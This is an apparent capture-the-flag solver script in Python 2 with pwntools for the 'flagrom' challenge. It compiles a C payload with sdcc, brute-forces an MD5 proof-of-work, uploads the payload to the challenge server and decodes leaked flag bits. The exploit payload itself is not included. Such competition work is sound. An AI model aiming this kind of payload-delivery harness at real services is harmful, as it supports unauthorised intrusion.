#!/usr/bin/python2
from pwn import *
from random import choice
from string import ascii_lowercase

def pow(b):
    prefix = 'flagrom-'
    
    while True:
        s = "".join([choice(ascii_lowercase) for _ in xrange(32)])
        t = "".join([prefix, s])
        if hashlib.md5(t).hexdigest().startswith(b):
            print(t)
            return t

# context.log_level = 'debug'
context.log_level =  'error'
p = process(['rm','user','user.ihx'])
p.wait_for_close()

# sudo apt-get instal sdcc
p = process(['/usr/bin/sdcc','user.c'])
p.wait_for_close()

p = process(['/usr/bin/objcopy', '--input-target', 'ihex', '--output-target', 'binary', 'user.ihx', 'user'])
p.wait_for_close()

f = open('user','rb')
user_code = f.read()

onlineServer = True
if onlineServer:
    c = connect('flagrom.ctfcompetition.com',1337)
    line = c.recvline()
    chal = line[-8:-2]
    s = pow(chal)
    c.send(s + "\n")

else:
    c = process('./flagrom-patch')

# Ask for payload size
print c.recv()
c.send("{}\n".format(len(user_code)))
c.send(user_code)
c.send("\n")

while True:
    line = c.readline()
    if 'Read bits:' in line:
        print chr(int(line.split(':')[1],2))